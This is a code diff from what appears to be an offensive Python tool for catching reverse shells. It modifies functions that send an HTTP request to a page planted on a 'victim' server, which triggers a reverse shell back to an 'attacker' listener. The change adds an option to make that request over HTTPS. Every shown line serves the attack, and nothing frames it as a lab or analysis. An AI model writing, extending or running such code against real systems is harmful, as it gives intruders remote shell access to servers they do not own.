@@ -84,24 +84,30 @@ def listen(ip, port, general_info):
 	conn.close()
 
 
-def listen_shell(victim_info, attacker_info, general_info):
+def listen_shell(victim_info, attacker_info, general_info, secure):
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(attacker_info['ip'], r_port):
 		r_port = random.randint(1024, 65536)
-	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port']))
+	s = ''
+	if secure:
+		s = 's'
+	else:
+		s = ''
+	
+	get_access = threading.Thread(target=task, args=(victim_info['ip'], victim_info['port'], s))
 	get_access.start() # Access the page that contains the reverse shell in order to establish connection
 	listen(attacker_info['ip'],int(attacker_info['port']), general_info)
 
 
-def task(v_ip, v_port):
+def task(v_ip, v_port, s=''):
 
 	time.sleep(1)
 	now = datetime.datetime.now()
 	print('[*] Executing Thread for HTTP Request')
 	if os.path.exists('./tmp_file_with_dest_url.txt'):
 		f = open('./tmp_file_with_dest_url.txt', 'r')
-		url = 'http://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
+		url = 'http' + s + '://' + v_ip + ':' + str(v_port) + str(f.readline()).replace('\n', '')
 		f.close()
 		print('[*] Making request to execute reverse shell ', url)
 		# Make the timeout very low in order not to wait for response
